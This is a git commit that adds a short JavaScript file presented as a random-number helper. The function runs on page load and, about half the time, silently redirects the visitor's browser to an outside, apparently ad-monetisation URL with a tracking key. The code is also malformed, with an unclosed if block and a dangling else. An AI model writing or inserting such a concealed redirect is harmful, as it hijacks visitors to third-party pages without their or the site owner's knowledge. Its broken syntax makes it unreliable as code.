172ab2fcc18d73cbda10cc5dbc2215f74c522410
saputarlynrh69 <83766843+saputarlynrh69@users.noreply.github.com>
2021-05-06 20:42:10 +0800

    Create js.js

---
+++ js.js
@@ -0,0 +1,18 @@
+function randomNum(minNum,maxNum){ 
+    switch(arguments.length){ 
+        case 1: 
+            return parseInt(Math.random()*minNum+1,10); 
+        break; 
+        case 2: 
+            num = parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
+			if(num > 1000){
+				window.location.href='https://www.performancetrustednetwork.com/pr4rcwtb?key=26f55289e7e407ad25d69c96b6520b75';
+			else{
+			}
+        break; 
+            default: 
+                return 0; 
+            break; 
+    } 
+} 
+randomNum(1,2000)
